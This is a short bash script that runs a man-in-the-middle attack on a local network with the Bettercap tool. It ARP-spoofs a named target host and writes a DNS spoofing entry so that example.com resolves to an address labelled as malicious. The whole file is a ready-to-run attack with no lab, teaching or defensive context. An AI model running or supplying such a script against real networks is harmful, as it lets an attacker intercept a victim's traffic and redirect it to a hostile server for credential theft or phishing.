#!/bin/bash

# Variables
INTERFACE="en0"
TARGET="192.168.1.10"
DNS_SPOOF_FILE="dns_spoof.txt"
MALICIOUS_IP="192.168.1.50"

# Create DNS spoofing file
echo "Creating DNS spoofing file..."
echo "example.com A $MALICIOUS_IP" > $DNS_SPOOF_FILE

# Start Bettercap with ARP and DNS spoofing
echo "Starting Bettercap for ARP and DNS spoofing..."
sudo bettercap -iface $INTERFACE -eval "
    set arp.spoof.targets $TARGET;
    arp.spoof on;
    set dns.spoof.domains example.com;
    set dns.spoof.address $MALICIOUS_IP;
    dns.spoof on"
